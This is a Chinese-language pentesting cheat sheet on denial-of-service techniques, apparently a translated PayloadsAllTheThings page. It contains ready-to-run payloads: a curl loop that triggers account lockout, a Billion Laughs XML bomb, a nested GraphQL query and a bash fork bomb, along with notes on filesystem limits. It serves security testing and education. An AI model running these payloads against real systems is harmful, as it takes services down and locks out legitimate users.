# 拒绝服务

> 拒绝服务（DoS）攻击旨在通过向服务发送大量非法请求或利用目标软件的漏洞使其崩溃或性能下降，从而导致服务不可用。在分布式拒绝服务（DDoS）中，攻击者使用多个来源（通常是被劫持的机器）同时执行攻击。

## 概要

* [方法论](#方法论)
    * [锁定客户账户](#锁定客户账户)
    * [文件系统上的文件限制](#文件系统上的文件限制)
    * [与技术相关的内存耗尽](#与技术相关的内存耗尽)
* [参考文献](#参考文献)

## 方法论

以下是拒绝服务（DoS）攻击的一些示例。这些示例应作为理解该概念的参考，但任何DoS测试都应谨慎进行，因为它可能会中断目标环境，并可能导致访问丢失或敏感数据暴露。

### 锁定客户账户

当测试客户账户时可能发生的拒绝服务示例。
请注意，这很可能是**超出范围**的，并且对业务可能有重大影响。

* 在账户在X次错误尝试后被临时/永久禁止时，多次尝试登录页面。

    ```ps1
    for i in {1..100}; do curl -X POST -d "username=user&password=wrong" <target_login_url>; done
    ```

### 文件系统上的文件限制

当进程在服务器上写入文件时，尝试达到文件系统格式允许的最大文件数。当达到限制时，系统应输出消息：`设备上没有空间`。

| 文件系统 | 最大Inodes数量 |
| --- | --- |
| BTRFS | 2^64（约18京） |
| EXT4 | 约40亿 |
| FAT32 | 约2.68亿个文件 |
| NTFS | 约42亿（MFT条目） |
| XFS | 动态（磁盘大小） |
| ZFS | 约281万亿 |

这种技术的另一种方式是填充应用程序使用的文件，直到达到文件系统的最大允许大小，例如这可能发生在SQLite数据库或日志文件中。

FAT32有显著的**4GB**限制，这就是为什么它经常被exFAT或NTFS取代以支持更大的文件。

现代文件系统如BTRFS、ZFS和XFS支持EB级规模的文件，远远超过当前的存储容量，使其成为大型数据集的未来保障。

### 与技术相关的内存耗尽

根据网站所使用的技术，攻击者可能有能力触发特定的功能或范式，从而消耗大量的内存。

* **XML外部实体**：Billion laughs攻击/XML炸弹

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
    ```

* **GraphQL**：深度嵌套的GraphQL查询。

    ```ps1
    query { 
        repository(owner:"rails", name:"rails") {
            assignableUsers (first: 100) {
                nodes {
                    repositories (first: 100) {
                        nodes {
                            
                        }
                    }
                }
            }
        }
    }
    ```

* **图像缩放**：尝试发送带有修改过的头的无效图片，例如异常尺寸、大像素数。
* **SVG处理**：SVG文件格式基于XML，尝试Billion laughs攻击。
* **正则表达式**：ReDoS
* **Fork Bomb**：在循环中快速创建新进程，消耗系统资源，直到机器变得无响应。

    ```ps1
    :(){ :|:& };:
    ```

## 参考文献

* [DEF CON 32 - 实用的Bug赏金中的DoS利用 - Roni Lupin Carta - 2024年10月16日](https://youtu.be/b7WlUofPJpU)
* [拒绝服务速查表 - OWASP速查表系列 - 2019年7月16日](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)